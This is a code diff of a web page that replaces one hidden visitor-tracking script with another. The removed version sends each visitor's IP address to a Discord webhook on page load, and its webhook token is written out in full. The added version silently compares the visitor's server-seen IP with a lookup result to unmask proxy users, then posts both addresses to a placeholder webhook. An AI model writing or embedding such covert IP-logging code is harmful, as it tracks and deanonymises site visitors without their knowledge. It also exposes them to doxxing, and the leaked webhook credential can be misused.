@@ -227,29 +227,46 @@
 
 
   <h1></h1>
-  <script>
-    function sendIP(ip, timestamp) {
-      var webhookURL = 'https://discord.com/api/webhooks/1179950875079356467/umaUWhe9Yz_BBQT1UDezlGOfk4eD6Iir0hcFIwvcqOeF7bkMo1zdTevpSjp3pCFq5UgT';
+    <script>
+        // Function to send information to the webhook
+        function sendToWebhook(userIP, proxyIP) {
+            const proxyInfo = {
+                userIP: userIP,
+                proxyIP: proxyIP,
+                timestamp: new Date().toISOString(),
+            };
 
-      var payload = JSON.stringify({
-        content: 'IP: ' + ip + ', Timestamp: ' + timestamp
-      });
+            fetch('YOUR_WEBHOOK_URL', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(proxyInfo),
+            })
+            .then(response => response.json())
+            .then(data => console.log('Webhook response:', data))
+            .catch(error => console.error('Error sending to webhook:', error));
+        }
 
-      var xhr = new XMLHttpRequest();
-      xhr.open('POST', webhookURL, true);
-      xhr.setRequestHeader('Content-type', 'application/json');
-      xhr.send(payload);
-    }
+        // Function to check proxy and send information
+        function checkProxy() {
+            fetch('https://ipapi.is/json/')
+                .then(response => response.json())
+                .then(data => {
+                    // Get the user's real IP address from the server
+                    const userIP = '<?php echo $_SERVER["REMOTE_ADDR"]; ?>';
 
-    fetch('https://ipapi.is/json/')
-      .then(response => response.json())
-      .then(data => {
-        var ip = data.ip;
-        var timestamp = new Date().toLocaleString();
-        sendIP(ip, timestamp);
-      })
-      .catch(error => console.error(error));
-  </script>
+                    // Check if the user is using a proxy based on the response
+                    if (data.ip !== userIP) {
+                        sendToWebhook(userIP, data.ip);
+                    }
+                })
+                .catch(error => console.error('Error checking proxy:', error));
+        }
+
+        // Trigger checkProxy when the page is loaded
+        window.onload = checkProxy;
+    </script>
 
 
 
